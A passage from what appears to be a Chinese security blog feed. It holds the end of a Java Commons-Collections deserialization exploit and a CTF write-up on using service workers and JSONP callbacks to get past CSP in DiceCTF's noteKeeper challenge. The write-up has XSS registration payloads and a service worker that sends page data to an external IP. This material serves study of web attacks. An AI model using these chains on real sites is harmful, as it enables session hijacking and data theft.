class="hljs-keyword">new</span> Class[] &#123;<br>                        Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, execArgs),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        <span class="hljs-keyword">final</span> Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);<br><br>        TiedMapEntry entry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;KKfine&quot;</span>);<br><br>        BadAttributeValueExpException val = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Field valfield = val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-keyword">true</span>);<br>        valfield.set(val, entry);<br><br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        BadAttributeValueExpException calc = getObject(<span class="hljs-string">&quot;calc&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<span class="hljs-comment">//用于存放person对象序列化byte数组的输出流</span><br><br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(calc);<span class="hljs-comment">//序列化对象</span><br>        objectOutputStream.flush();<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="hljs-comment">//读取序列化后的对象byte数组</span><br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<span class="hljs-comment">//存放byte数组的输入流</span><br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        Object o = objectInputStream.readObject(); <span class="hljs-comment">//将byte数组输入流反序列化</span><br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss中关于service worker的使用</title>
    <link href="/2022/03/10/2022-3-10xss%E4%B8%AD%E5%85%B3%E4%BA%8Eservice%20worker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/03/10/2022-3-10xss%E4%B8%AD%E5%85%B3%E4%BA%8Eservice%20worker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="关于Service-Worker在xss中的使用"><a href="#关于Service-Worker在xss中的使用" class="headerlink" title="关于Service Worker在xss中的使用"></a>关于Service Worker在xss中的使用</h1><p>这篇文章会介绍一下<code>Service Worker</code>在xss中的一些利用，主要是ctf题目中的应用。</p><p>参考文章：<a href="https://brycec.me/posts/dicectf_2022_writeups#notekeeper">https://brycec.me/posts/dicectf_2022_writeups#notekeeper</a></p><h2 id="service-worker-的简介"><a href="#service-worker-的简介" class="headerlink" title="service worker 的简介"></a>service worker 的简介</h2><h3 id="service-worker的概念"><a href="#service-worker的概念" class="headerlink" title="service worker的概念"></a>service worker的概念</h3><blockquote><p>Service worker是一个注册在指定源和路径下的事件驱动<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker">worker</a>。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p><p>Service worker运行在worker上下文，因此它不能访问DOM。相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。它设计为完全异步，同步API（如<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XHR</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/API/DOM/Storage">localStorage</a>）不能在service worker中使用。</p><p>出于安全考量，Service workers只能由HTTPS（出于调试方便，还支持在localhost使用），毕竟修改网络请求的能力暴露给中间人攻击会非常危险。在Firefox浏览器的<a href="https://support.mozilla.org/zh-CN/kb/%E9%9A%90%E7%A7%81%E6%B5%8F%E8%A7%88">用户隐私模式</a>，Service Worker不可用。</p></blockquote><p>从官方文档中可以看出一些要点：</p><p>1、只能注册同源下的js</p><p>2、站内必须支持Secure Context，也就是站内必须是<code>https://</code>或者<code>http://localhost/</code></p><p>3、Content-Type必须是js</p><ul><li>text/javascript</li><li>application/x-javascript</li><li>application/javascript</li></ul><p>还有一些关于<code>service worker</code>的基本框架以及作用域问题可以直接查看</p><p>[]: <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a>    “文档”</p><p>所以<code>service worker</code>到底可以用来干些什么呢。其实从它的作用域也能看出来一些东西，例如<code>service worker</code>只能抓取在service worker scope中发出来的请求，既然这样就可以利用它来进行一些文件，网站等的缓存，同时还以监听一些请求并对responce做出篡改。</p><h2 id="service-worker的简单使用"><a href="#service-worker的简单使用" class="headerlink" title="service worker的简单使用"></a>service worker的简单使用</h2><p>在这个demo中当页面加载完成时，使用<code>navigator.serviceWorker.register</code>来注册一个<code>service worker</code>，并且作用于全局</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>navigator对象的使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;parentElement&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;childElement&quot;</span>&gt;</span>foo bar<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ok&quot;</span>)</span><br><span class="javascript">              <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                navigator.serviceWorker.register(<span class="hljs-string">&#x27;sw.js&#x27;</span>, &#123;<span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span>&#125;) <span class="hljs-comment">//作用于全局</span></span><br><span class="javascript">                .then(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;successful&#x27;</span>)</span><br>                &#125;)<br><span class="javascript">                .catch(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>)</span><br>                &#125;)<br>              &#125;)<br>            &#125;<br>        <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>关于sw.js，从service worker的流程可以看出需要先监听install事件，这里在监听到安装后会进行缓存，然后就可以监听一些事件，但需要时serviceworker支持的事件。这里监听了一个<code>fetch</code>请求，同时篡改了响应，在其中插入了一个script标签</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201218123819-da94a1fe-40ea-1.png" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// 监听service worker的install事件</span><br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 如果监听到了service worker已经安装成功的话</span><br>    <span class="hljs-comment">// 就会调用event.waitUtil回调函数</span><br>    event<br>        .waitUntil(<br>        <span class="hljs-comment">// 安装成功后调用CacheStorage缓存，使用之前先通过caches.open()</span><br>        <span class="hljs-comment">// 打开对应的缓存空间</span><br>            caches.open(<span class="hljs-string">&#x27;my-test-cache-v1&#x27;</span>)<br>            .then(<span class="hljs-function">(<span class="hljs-params">cache</span>) =&gt;</span> &#123;<br>                <span class="hljs-comment">// 通过cache缓存对象的addAll方法添加</span><br>                <span class="hljs-keyword">return</span> cache.addAll([<br>                    <span class="hljs-string">&#x27;/&#x27;</span>,<br>                    <span class="hljs-string">&#x27;/index.html&#x27;</span><br>                ])<br>            &#125;)<br>        )<br>&#125;)<br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(event.request);<br>            event.respondWith(<br>            caches.match(event.request).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Response(<span class="hljs-string">&#x27;&lt;script&gt;location=&quot;http://39.107.239.30:2333?&quot;+btoa(location.search)&lt;/script&gt;&#x27;</span>, &#123;<span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;&#125;)<br>            &#125;)<br>            )<br>&#125;)<br></code></pre></div></td></tr></table></figure><p>访问一下可以很清楚的看到一些缓存</p><p><img src="https://img-blog.csdnimg.cn/bef79f2e921b4b1b8c6f28de176de27c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="关于jsonp的跨域特点"><a href="#关于jsonp的跨域特点" class="headerlink" title="关于jsonp的跨域特点"></a>关于jsonp的跨域特点</h2><p>现在的浏览器普遍都有同源策略保护着，但是在同源下如何引用外来的js文件或者其他的文件呢。jsonp是可以解决一下跨域问题的。</p><p><code>JSONP</code>的原理</p><blockquote><p><code>JSONP</code>是<code>JSON with Padding</code>的简称，一般用来解决<code>Ajax</code>跨域的问题。它是这样产生的：</p><ol><li>页面上调用<code>js</code>文件时不受跨域的影响，而且，凡是拥有<code>src</code>属性的标签都拥有跨域的能力，比如<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>。</li><li>可以在远程服务器上设法把数据装进<code>js</code>格式的文件里，供客户端调用处理，实现跨域。</li><li>目前最常用的数据交换方式是<code>JSON</code>，客户端通过调用远程服务器上动态生成的<code>js</code>格式文件（一般以<code>JSON</code>后缀）。</li><li>客户端成功调用<code>JSON</code>文件后，对其进行处理。</li><li>为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作<code>JSONP</code>，该协议的一个要点就是允许用户传递一个<code>callback</code>参数给服务端，然后服务端返回数据时会将这个<code>callback</code>参数作为函数名来包裹住<code>JSON</code>数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。</li></ol></blockquote><p>一些jsonp的具体实现可以看看官方文档，其实就是通过一些字符串的拼接，来构造出特定的调用函数的形式，并将这种json返回给浏览器，从而在浏览器上而可以直接调用<code>js</code>格式文件</p><h2 id="dicectf一道有趣的xss题目"><a href="#dicectf一道有趣的xss题目" class="headerlink" title="dicectf一道有趣的xss题目"></a>dicectf一道有趣的xss题目</h2><blockquote><p>noteKeeper 是个有趣的 XSS 挑战，目标是窃取管理员的语音备忘录。</p></blockquote><h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>首先审计源码，看index可以发现使用了很严格的csp规则，无法使用iframe-src，同时限制了script的来源。但是这里很重要的一点就是，app在使用api路由中间件之后才使用了csp中间件，这意味着在api路由上并不存在csp规则，这样才有了后续的做法。</p><p><img src="https://img-blog.csdnimg.cn/68a3d8ff5d4f4d36a2e195ced516b02e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在前端的script.js文件中可以看到很明显的xss，<code>load_user</code>中直接将用户名赋值到了<code>innerHTML</code>中，并且没有任何过滤。所以这里可以插入一些html标签</p><p><img src="https://img-blog.csdnimg.cn/076c792954954cec953bb42200a96d0e.png" alt="在这里插入图片描述"></p><p>再看到关于用户登陆注册的源码。在api中可以发现，在注册的地方进行了一些限制。username的长度要在[5,16]之间，这样的话显然需要绕过了。同时可以看到这段代码并没有检查username的类别，所以我们可以构造一个数组来进行绕过，类似于<code>username=&lt;xss payload&gt;&amp;username=b&amp;password=password</code>这样。但是 innerHTML 不允许 script 标签运行。但一个简单的解决方法就是使用 iframe srcdoc，并让<code>window.parent</code>用作对父窗口的引用。</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.post(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.body;<br><br>    <span class="hljs-keyword">if</span>(db.hasUser(username)) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">`A user already exists with username <span class="hljs-subst">$&#123;username&#125;</span>`</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(username.length &gt; <span class="hljs-number">16</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Invalid username&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(password.length &lt; <span class="hljs-number">5</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Please choose a longer password&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">await</span> db.addUser(username, password);<br><br>    jwt.signData(res, username, &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Registered successfully&quot;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;primary&quot;</span> &#125;);<br>    res.redirect(<span class="hljs-string">&quot;/home&quot;</span>);<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>能够执行xss代码了下面就需要考虑如何利用xss进行窃取语音备忘录了。继续审计源码可以发现很关键的jsonp函数，源码中限制了callback的类别，同时过滤了eval回调。同时后续的中间件也进行了 JSONP 过滤，该过滤会删除任何不是字母数字、点或括号的内容。这样的话我们直接在用户界面上执行xss有些不太现实。</p><p><img src="https://img-blog.csdnimg.cn/891d3c67bb6645d4944afac0cb273772.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>到这里就需要service worker的作用了。引用一些出题人的原话：</p><blockquote><p>但是，如果我们可以让页面加载不在页面上的脚本呢？这是不可能的，因为有一个严格的 CSP，但还记的 CSP 是如何不在 /api 路由上的吗？</p><p>我们能以某种方式在这些 API 路由之一上获取脚本吗？是的，我们可以，这要归功于服务人员的力量！（注意：显然服务人员被高估了，其他团队没有解决使用它们😢）</p><p>服务人员很酷，因为他们获取安装脚本所在页面的 CSP。因此，如果我们从某个 API 端点使用 JSONP 安装脚本，它们将没有 CSP！</p><p>使用 JSONP 端点，我们可以调用<code>window.parent.navigator.serviceWorker.register</code>它将从包含 JS 的页面注册一个服务工作者。我们可以让这个目标成为另一个 JSONP 端点，然后我们可以有一个回调，它在服务工作者范围内运行代码。但是我们可以运行什么服务工作者代码呢？</p><p>我们希望完整的 JS 执行不受 JSONP 的限制，那么我们可以使用<code>import()</code>导入 JS 并从文件中运行它吗？嗯, 不, 因为<code>import()</code>在服务人员中不起作用。但是<code>importScripts()</code>有！</p><p>因此，为了使用服务工作者获的完整的 JS 执行，我们需要控制两个 JSONP 端点，一个注册服务工作者并将脚本 URL 指向另一个 JSONP 端点，第二个 JSONP 端点需要运行<code>importScripts()</code>并指向一个具有JS我们控制。</p></blockquote><p>这是这道题目最核心的地方，也是很巧妙的地方。因为JSONP端点可以回调任意函数，所以我们可以注册一个service来使用外部的js文件，同时通过importScripts()导入。这样我们就能执行一个完整的任意js代码。</p><p>还有关于备忘录访问的代码，再请求头中限制了<code>Sec-Fetch-Site</code>和<code>Sec-Fetch-Dest</code>。这些<code>Sec-Fetch</code>标头阻止我们仅获取音频 - 它需要放置在音频标签中。而且我们无法从缓存中获取它，因为有<code>Cache-Control</code>标头</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.get(<span class="hljs-string">&quot;/audio/file&quot;</span>, requiresLogin, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(!db.getMemo(req.user.username)) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(req.header(<span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>) !== <span class="hljs-string">&quot;audio&quot;</span> || req.header(<span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>) !== <span class="hljs-string">&quot;same-origin&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br><br>    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>, <span class="hljs-string">&#x27;audio/mpeg&#x27;</span>);<br>    res.sendFile(db.getMemo(req.user.username), &#123; <span class="hljs-attr">root</span>: <span class="hljs-string">&quot;.&quot;</span> &#125;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><h3 id="攻击操作"><a href="#攻击操作" class="headerlink" title="攻击操作"></a>攻击操作</h3><p>利用fetch先注册，也可以抓包等等</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><p>登录成功后会自行执行，</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;iframe srcdoc=<span class="hljs-string">&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure><p>但是此时notes中我们并没有添加任何东西所以它是这样的</p><p><img src="https://img-blog.csdnimg.cn/1108c6bf7c184f9bbbacdccd53572cd1.png" alt="在这里插入图片描述"></p><p>在这里我们如果直接写一个notes类似于<code>//39.107.239.30:2333/sw.js</code>，然后变成</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">/**/</span> <span class="hljs-keyword">typeof</span> <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register([<span class="hljs-string">&quot;//39.107.239.30:2333/sw.js&quot;</span>])<br></code></pre></div></td></tr></table></figure><p>这看似很合理但实际上会是这样的</p><p><img src="https://img-blog.csdnimg.cn/959bfd9e1e654619af4ff1b156cd20c0.png" alt="在这里插入图片描述"></p><p>所以出题人所说的<code>控制两个 JSONP 端点</code>一个是注册的时候利用一次jsonp端点回调，另外一次在于这里写入notes，这样的话便再一次通过jsonp的跨域特点绕过同源策略。</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts<br></code></pre></div></td></tr></table></figure><p>其实做到这里最开始我在想为什么不直接importScripts我们的文件不就得了，然后在最后加一个注释符，类似于</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts(<span class="hljs-string">&#x27;//vps:port/notekeeper.js&#x27;</span>);<span class="hljs-comment">//</span><br></code></pre></div></td></tr></table></figure><p>但是实践证实源码中使用的是<code>res.jsonp()</code>，所以在官方express的jsonp中进行了一些过滤。它会变成这样</p><p><img src="https://img-blog.csdnimg.cn/56352d835ea54cf4b2022b2f8c7efdd9.png" alt="在这里插入图片描述"></p><p>所以正确导入后，最后的结果会是这样</p><p><img src="https://img-blog.csdnimg.cn/8fa4fbd59b044aa3a28977d03ab3a475.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/5df5056ff00a41b6887e60e255ae83c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这样就引入了我们外部的js文件，并且可以完整的执行任意js代码。所以这里的js代码如何用来窃取备忘录呢。</p><p>最开始其实说到了一个service worker是可以拦截一个fetch请求的，并且可以篡改responce。所以这里如果可以让admin在访问我们提供的界面时请求另一个界面，那我们是不是就可以拦截这个请求，然后执行我们自己的代码。并且利用js代码是可以将mp3的文件内容进行播放并转换成base编码的。同时你可以看到bot的js文件。bot的实现中，会先去访问我们提供的url，然后才会回到/home，最后是进行登出。看到出题人的记录还可以发现，其实我们可以直接在拦截过程中将click点击后的结果直接进行替换，让bot永远停留，播放我们要窃取的MP3文件。</p><p><img src="https://img-blog.csdnimg.cn/97feae30d51d41d2ab2a06880910dc06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>所以如何让admin访问时请求另一个界面，可以通过控制jsonp函数进行window.opener的回调就可以了！然后在service worker中用window.opener.origin回到最初的窗口。然后通过dom找到我们需要的audio，进行录制。</p><h3 id="最终的攻击流程"><a href="#最终的攻击流程" class="headerlink" title="最终的攻击流程"></a>最终的攻击流程</h3><p>首先需要事先注册两个用户，一个用来引用外部的js文件，如上。注册的service worker js代码为</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 